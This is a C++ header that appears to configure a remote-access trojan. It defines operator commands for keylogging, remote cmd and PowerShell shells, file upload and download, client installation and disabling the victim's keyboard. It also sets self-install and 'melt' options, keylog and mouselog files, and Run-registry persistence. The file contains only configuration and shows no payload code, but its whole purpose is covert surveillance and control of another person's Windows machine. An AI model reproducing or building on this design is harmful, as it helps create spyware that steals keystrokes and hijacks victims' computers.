#pragma once

#include <memory>
#include <atomic>
#include <vector>
#include <string>
#include <map>


struct Config
{
	struct ClCmdStrings
	{
		std::vector<std::string> CommandList = {
			{"disable-all"}, {"toggle-keylogger"},
			{"remote-cmd"}, {"remote-pws32" }, {"remote-pws64"},
			{"remoteproc"}, {"killclient"}, {"restart" },
			{"listClients"}, {"connect"}, {"switch"},
			{"exitsession"}, {"disconnect"}, {"close"},
			{"download"}, {"upload"}, {"broadcast" },
			{"installClient"}, {"help"}, { "toggle-keyboard" }
		};
	};
	ClCmdStrings cmdStrings;

	struct ClResponses
	{
		// These are all the responses that can be given.
		std::map<int, std::string> ClResponseStrings = {
			{0,"No Longer Sending Keystrokes!" }, {1,"Sending Keystrokes!"},
			{2,"Remote control process started, good luck."}, {3,"Remote calc process spawned."}
			,{4,"Disconnecting the client/server."},{5,"All options are toggled off."},
			{6, "Killing remote client process!"}, {7, "Restarting client application!"},
			{8, "Please connect to a session with $connect [Session Id]"},
			{9, "Alternatively you can do $close to quit out of this app"}, { 10, "Disabled keyboard Input!" },
			{11, "Enabled Keyboard Input!"}
		};
	};
	ClResponses Responses;

	/*
	* ------------------------------------------------------
	* ClAppConfig - Client App Config (structure)
	* ------------------------------------------------------
	*
	*		This is just a way to manage the config
	*	file that will be used by the client program.
	*	It's managed by a map of strings that are tied by
	*	an Id (an integer value) starting at zero.
	* ------------------------------------------------------
	*/
	struct ClAppConfig
	{
		std::map<int, std::string> Strings = {
			{0,"APPDATA" },{1, "ClientTest-Release.exe"}, {2, "ClientTest-Release folder"},
			{3, "ClientTest-Release startup"}, {4,"logs.txt"}, {5,"keylogs.txt"},
			{6,"mouselogs.txt"}, {7,"commands.asp"}, {8, "default.cfg"}
		};

		std::vector<std::string> DefaultPaths = {
			"C:\\WINDOWS\\System32\\cmd.exe",
			"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
			"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
			"C:\\Windows\\System32\\calc.exe"
		};

		std::string RegPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

		bool IsInstallSelf = false;
		bool IsMeltSelf = false;
		bool IsEventLogging = false;
		bool IsStartOnReboot = false;
		bool IsCustomLogPath = false;
		bool IsSettingSelfStartup = false;
	};
	ClAppConfig AppConfig;

	struct ClFlags
	{
		std::atomic<bool> IsRemoteCmd = false;
		std::atomic<bool> IsKeyLogging = false;
		std::atomic<bool> IsRemoteCalc = false;
		std::atomic<bool> IsMouseLogging = false;
		std::atomic<bool> DestroyAllThreads = false;
		std::atomic<bool> IsRemotePowerShell32 = false;
		std::atomic<bool> IsRemotePowerShell64 = false;
		std::atomic<bool> DisableKeyboard = false;
	};
	ClFlags Flags;
};

inline std::unique_ptr<Config> config;